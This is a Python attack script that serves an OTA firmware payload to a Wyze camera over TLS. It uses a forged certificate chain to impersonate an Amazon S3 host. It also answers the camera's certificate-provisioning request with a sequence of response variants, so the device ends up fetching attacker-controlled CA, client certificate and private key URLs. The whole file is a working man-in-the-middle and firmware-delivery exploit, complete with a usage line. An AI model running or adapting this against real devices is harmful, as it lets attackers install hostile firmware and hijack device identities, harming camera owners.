#!/usr/bin/env python3
"""Serve the OTA payload over TLS with a forged chain the camera trusts.

Bind :443 (or --port), present deliverables/certs/emudhra/{leaf.pem,leaf.key} with the cross-signed
intermediate appended, and serve --dir. Prints the chain it will send so a failure is diagnosable.

The camera reaches this by name, so something must resolve the name to this host: either a DNS
answer for the SAN host (see docs/exploit/wyze-forged-chain.md) or the delta URL pointed at a name
that already resolves here.

  wyze_forge_serve.py --dir /tmp/fwserve --port 443 --sni s3-us-west-2.amazonaws.com
"""
import argparse, http.server, json, os, ssl, sys

HERE = os.path.dirname(os.path.abspath(__file__))
CERTDIR = os.path.join(HERE, "..", "certs", "emudhra")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", default="/tmp/fwserve")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--cert", default=os.path.join(CERTDIR, "leaf.pem"))
    ap.add_argument("--key", default=os.path.join(CERTDIR, "leaf.key"))
    ap.add_argument("--intermediate", default=os.path.join(CERTDIR, "ev-ca-aaa-cross.pem"))
    ap.add_argument("--sni", default="s3-us-west-2.amazonaws.com", help="expected SNI, for the log")
    a = ap.parse_args()

    chain = os.path.join(CERTDIR, "serve.pem")
    # leaf FIRST: load_cert_chain treats the first certificate as the subject, the rest as chain
    with open(chain, "wb") as out:
        out.write(open(a.cert, "rb").read())
        out.write(open(a.intermediate, "rb").read())
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(chain, a.key)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *x, **kw):
            super().__init__(*x, directory=a.dir, **kw)

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n) if n else b""
            print(f"{self.address_string()} ua={self.headers.get('User-Agent','-')!r} "
                  f"POST {self.path} {body[:200]!r}", flush=True)
            if "get_iot_certificate" in self.path:
                # The stock client wants URLs, not inline PEM (EV-pack-H-002 §9.2). Each retry gets
                # the next envelope variant so the device itself walks the candidate list; the
                # accepted one is the variant after which it fetches the three URLs.
                base = "https://s3-us-west-2.amazonaws.com/fss"
                q = ("?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA%2F20261025%2Fus-west-2"
                     "%2Fs3%2Faws4_request&X-Amz-Date=20261025T000000Z&X-Amz-Expires=3600"
                     "&X-Amz-Signature=deadbeef")
                urls = {"ca_cert_url": base + "/rootCA.crt", "client_cert_url": base + "/cert.pem",
                        "client_private_key_url": base + "/privkey.pem"}
                pres = {k: v + q for k, v in urls.items()}
                ident = {"client_id": "80482c525905", "thing_name": "80482c525905", "keep_alive": 300}
                variants = [
                    ("int-code-msg", {"code": 1, "msg": "SUCCESS", "data": urls}),
                    ("str-code-msg", {"code": "1", "msg": "SUCCESS", "data": urls}),
                    ("int-code-message", {"code": 1, "message": "Success", "data": urls}),
                    ("int-code-msg-presigned", {"code": 1, "msg": "SUCCESS", "data": pres}),
                    ("int-code-msg-ident", {"code": 1, "msg": "SUCCESS", "data": {**urls, **ident}}),
                    ("root-cert-url", {"code": 1, "msg": "SUCCESS", "data": {
                        "root_cert_url": urls["ca_cert_url"], "client_cert_url": urls["client_cert_url"],
                        "client_private_key_url": urls["client_private_key_url"]}}),
                    ("bare-data", urls),
                    ("code-data-only", {"code": 1, "data": urls}),
                ]
                try:
                    i = int(open("/tmp/ota/cand_idx").read().strip())
                except Exception:
                    i = 0
                label, obj = variants[i % len(variants)]
                open("/tmp/ota/cand_idx", "w").write(str(i + 1))
                print(f"  -> variant[{i}] {label}", flush=True)
                out = json.dumps(obj).encode()
            else:
                out = b'{"code":1,"message":"Success"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, fmt, *args):
            # the device is distinguishable from a local probe only by its own UA
            print(f"{self.address_string()} ua={self.headers.get('User-Agent', '-')!r} " + (fmt % args),
                  flush=True)

    handler = Handler

    class Server(http.server.HTTPServer):
        allow_reuse_address = True

    srv = Server(("0.0.0.0", a.port), handler)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"serving {a.dir} on :{a.port}, expecting SNI {a.sni}, chain {chain}", flush=True)
    srv.serve_forever()
    return 0


if __name__ == "__main__":
    sys.exit(main())
